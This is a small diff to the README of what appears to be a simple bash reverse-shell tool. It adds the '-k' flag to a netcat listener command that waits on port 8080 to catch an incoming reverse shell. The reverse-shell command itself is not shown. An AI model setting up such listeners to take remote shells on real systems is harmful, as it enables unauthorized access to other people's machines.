@@ -6,7 +6,7 @@ Simple reverse shell in bash
 First run listener on machine where you want to access revers shell.
 for example:
 ```
-nc -l -p 8080 -vvv
+nc -l -p 8080 -vvv -k
 ```
 
 ```
